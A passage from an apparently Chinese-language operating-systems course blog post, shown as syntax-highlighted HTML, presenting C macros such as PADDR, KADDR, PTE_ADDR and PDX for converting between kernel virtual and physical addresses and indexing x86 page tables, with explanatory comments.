address.  It panics if you pass it a non-kernel virtual address.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="comment">//将内核虚地址转化为物理地址，若非内核虚地址会报错</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PADDR(kva) (&#123;                                                   \</span></span><br><span class="line">            <span class="keyword">uintptr_t</span> __m_kva = (<span class="keyword">uintptr_t</span>)(kva);                       \</span><br><span class="line">            <span class="keyword">if</span> (__m_kva &lt; KERNBASE) &#123;                                   \</span><br><span class="line">                panic(<span class="string">"PADDR called with invalid kva %08lx"</span>, __m_kva);  \</span><br><span class="line">            &#125;                                                           \</span><br><span class="line">            __m_kva - KERNBASE;                                         \</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * KADDR - takes a physical address and returns the corresponding kernel virtual</span></span><br><span class="line"><span class="comment"> * address. It panics if you pass an invalid physical address.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="comment">//将物理地址转化为内核虚地址，若非物理地址会报错，对la所在的二级页表的物理地址进行虚拟化</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KADDR(pa) (&#123;                                                    \</span></span><br><span class="line">            <span class="keyword">uintptr_t</span> __m_pa = (pa);                                    \</span><br><span class="line">            <span class="keyword">size_t</span> __m_ppn = PPN(__m_pa);                               \</span><br><span class="line">            <span class="keyword">if</span> (__m_ppn &gt;= npage) &#123;                                     \</span><br><span class="line">                panic(<span class="string">"KADDR called with invalid pa %08lx"</span>, __m_pa);    \</span><br><span class="line">            &#125;                                                           \</span><br><span class="line">            (<span class="keyword">void</span> *) (__m_pa + KERNBASE);                               \</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="comment">//对页表项进行4K对齐(截断低12位,低十二位变为0，高位不变)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTE_ADDR(pte)   ((uintptr_t)(pte) &amp; ~0xFFF)   </span></span><br><span class="line"><span class="comment">//对页目录项进行4K对齐(截断低12位)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PDE_ADDR(pde)   PTE_ADDR(pde)</span></span><br></pre></td></tr></table></figure></div>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PDXSHIFT        22                      <span class="comment">// offset of PDX in a linear address</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTXSHIFT        12                      <span class="comment">// offset of PTX in a linear address  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PDX(la) ((((uintptr_t)(la)) &gt;&gt; PDXSHIFT) &amp; 0x3FF)    <span class="comment">//一级页目录表的下标</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTX(la) ((((uintptr_t)(la)) &gt;&gt; PTXSHIFT) &amp; 0x3FF)    <span class="comment">//</span></span></span><br></pre></td></tr></table></figure></div>
